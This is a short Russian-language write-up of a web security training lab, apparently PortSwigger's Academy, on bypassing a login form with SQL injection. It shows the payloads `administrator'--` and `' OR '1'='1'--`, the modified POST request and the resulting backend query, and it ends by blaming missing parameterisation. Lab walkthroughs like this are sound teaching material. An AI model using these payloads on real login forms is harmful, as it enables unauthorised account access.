# SQLi — Login bypass: входим без пароля

**Lab:** SQL injection vulnerability allowing login bypass  
**Уровень:** Apprentice  
**Статус:** Solved

---

## TL;DR

Уязвимость в логине: поле `username` напрямую вставляется в SQL-запрос без фильтрации. Через инъекцию `OR '1'='1'--` обходим аутентификацию и заходим под админом.

---

## Исходный запрос

Форма логина отправляет POST-запрос:

```http
POST /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator&password=anyvalue
```

На бэкенде выполняется:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'anyvalue'
```

---

## Цель

Обойти проверку логина и попасть в аккаунт администратора без знания пароля.

---

## Эксплуатация

Модифицируем поле `username` на:

```
administrator'-- 
```

или используем логическое выражение:

```
' OR '1'='1'--
```

Обновлённый запрос:

```http
POST /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator'-- &password=irrelevant
```

На бэкенде запрос превращается в:

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'irrelevant'
```

`--` комментирует остаток запроса, условие по паролю игнорируется.

---

## Проверка

Если после отправки модифицированного запроса происходит вход в систему под админом — уязвимость успешно использована.

---

## Что проверили

- Инъекция в поле `username`
- Обход аутентификации через комментарий `--`
- Отсутствие параметризации в SQL-запросе

---

## Скрин

![sqli-login-bypass](./02.png)

---

## Вывод

Классическая уязвимость в логине через SQL-инъекцию. Отсутствие параметризации и фильтрации пользовательского ввода позволяет обойти аутентификацию. Такие уязвимости всё ещё встречаются в реальных приложениях, особенно в устаревших системах.
